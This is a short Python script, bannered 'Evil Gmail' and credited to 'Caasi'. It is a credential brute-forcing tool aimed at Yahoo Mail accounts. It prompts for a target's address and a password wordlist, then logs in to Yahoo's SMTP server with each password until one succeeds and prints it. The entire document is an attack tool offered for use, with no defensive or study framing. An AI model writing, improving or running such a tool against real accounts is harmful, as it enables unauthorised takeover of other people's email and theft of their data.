import smtplib
import time

print ("___________     .__.__      ________               .__.__")   
print ("\_   _____/__  _|__|  |    /  _____/  _____ _____  |__|  |       Made by Caasi")  
print (" |    __)_\  \/ /  |  |   /   \  ___ /     \\__  \ |  |  |       https://github.com/MrGoku21") 
print (" |        \\   /|  |  |__ \    \_\  \  Y Y  \/ __ \|  |  |__")
print ("/_______  / \_/ |__|____/  \______  /__|_|  (____  /__|____/")
print ("        \/                        \/      \/     \/")         

smtpserver = smtplib.SMTP("smtp.mail.yahoo.com", 587)   
smtpserver.ehlo() # Says hello to the smtp server
smtpserver.starttls()

print ("")
user = input("Enter the target's yahoo address: ")
passwfile = input ("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try: 
        smtpserver.login(user, password)
        print ("[+] Passsword Found: %s" %password)
        print ("")
        time.sleep(1)
        break;

    except smtplib.SMTPAuthenticationError:
        print ("")
        print ("[!] Password wrong: %s" %password)


